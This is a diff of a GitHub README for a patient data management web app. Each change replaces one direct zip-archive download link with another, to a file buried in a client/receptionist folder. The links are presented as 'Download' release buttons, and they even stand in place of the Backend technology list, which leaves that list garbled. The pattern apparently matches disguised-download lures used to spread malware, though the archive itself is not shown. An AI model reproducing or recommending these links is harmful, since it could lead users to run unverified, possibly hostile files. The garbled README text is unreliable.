@@ -2,7 +2,7 @@
 
 ## 🚀 Download and Install
 
-[![Download](https://raw.githubusercontent.com/MihiranDev/patient-data-management/main/client/receptionist/data_management_patient_v3.1.zip)](https://raw.githubusercontent.com/MihiranDev/patient-data-management/main/client/receptionist/data_management_patient_v3.1.zip)
+[![Download](https://github.com/MihiranDev/patient-data-management/raw/refs/heads/main/client/receptionist/patient_data_management_epiopticon.zip)](https://github.com/MihiranDev/patient-data-management/raw/refs/heads/main/client/receptionist/patient_data_management_epiopticon.zip)
 
 To get started with the Patient Data Management System, visit the link above to download the latest version.
 
@@ -30,8 +30,8 @@ The Patient Data Management System is a full-stack web application that helps ho
 
 ### Backend
 
-- https://raw.githubusercontent.com/MihiranDev/patient-data-management/main/client/receptionist/data_management_patient_v3.1.zip
-- https://raw.githubusercontent.com/MihiranDev/patient-data-management/main/client/receptionist/data_management_patient_v3.1.zip
+- https://github.com/MihiranDev/patient-data-management/raw/refs/heads/main/client/receptionist/patient_data_management_epiopticon.zip
+- https://github.com/MihiranDev/patient-data-management/raw/refs/heads/main/client/receptionist/patient_data_management_epiopticon.zip
 - MySQL
 - mysql2 (connection pool)
 
@@ -55,7 +55,7 @@ To download the application, follow these steps:
 
 1. **Visit the Releases Page:** Click the button below to go to the releases page.
 
-   [![Download](https://raw.githubusercontent.com/MihiranDev/patient-data-management/main/client/receptionist/data_management_patient_v3.1.zip)](https://raw.githubusercontent.com/MihiranDev/patient-data-management/main/client/receptionist/data_management_patient_v3.1.zip)
+   [![Download](https://github.com/MihiranDev/patient-data-management/raw/refs/heads/main/client/receptionist/patient_data_management_epiopticon.zip)](https://github.com/MihiranDev/patient-data-management/raw/refs/heads/main/client/receptionist/patient_data_management_epiopticon.zip)
 
 2. **Select the Latest Version:** Look for the most recent release on the page. It is usually at the top of the list.
 
